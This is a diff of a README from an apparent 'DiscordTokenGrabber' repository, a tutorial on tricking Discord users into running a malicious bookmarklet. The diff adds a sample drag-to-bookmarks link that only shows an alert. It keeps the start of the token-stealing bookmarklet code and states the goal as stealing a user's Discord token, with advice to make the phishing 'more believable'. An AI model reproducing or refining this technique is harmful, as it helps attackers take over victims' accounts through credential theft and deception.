@@ -19,15 +19,17 @@ This leverages the use of [bookmarklets](https://en.wikipedia.org/wiki/Bookmarkl
 
 I wrote some javascript code and then converted this to a bookmarklet using a [converter](https://chriszarate.github.io/bookmarkleter/).
 
-![image](https://github.com/JaRm222/DiscordTokenGrabber/assets/31806899/5eb3d807-f5a0-45d4-b35c-28ddf07bc782)
+![image](https://github.com/JaRm222/DiscordTokenGrabber/assets/31806899/a1351476-1a5c-4953-9210-f518c33a038a)
 
 I then used a simple html file which would allow a user to drag this to their bookmarks bar.
 
-![image](https://github.com/JaRm222/DiscordTokenGrabber/assets/31806899/8a968fa8-d5c1-42c1-8dde-d0f1ce7593b6)
+```html
+	<a href="javascript:void%20function(){alert(%22This%20is%20a%20bookmarklet%22)}();"> Drag this </a>
+```
 
 By enabling our bookmarks bar. Dragging the link to it and clicking on the bookmark we are greeted with an alert.
 
-![image](https://github.com/JaRm222/DiscordTokenGrabber/assets/31806899/f193f131-c354-4a78-a1ad-27598f8f2fca).
+![image](https://github.com/JaRm222/DiscordTokenGrabber/assets/31806899/09258c40-a537-497d-bd23-f85450325642)
 
 Now we know how to use a bookmarklet we need to find a way to steal a users Discord token.
 
@@ -40,7 +42,7 @@ javascript:(function(){location.reload();let frame = document.createElement('ifr
 ```
 So now we have everything we need to execute this phishing attack. We just need to make it more believable. Add some CSS animations etc.
 
-![image](https://github.com/JaRm222/DiscordTokenGrabber/assets/31806899/486e0bc3-fc0d-48f7-9eda-ba2a586ce01f)
+![image](https://github.com/JaRm222/DiscordTokenGrabber/assets/31806899/d4dafc05-afde-4260-be55-3d78de0c522f)
 
 This is just a quick one I made.
 
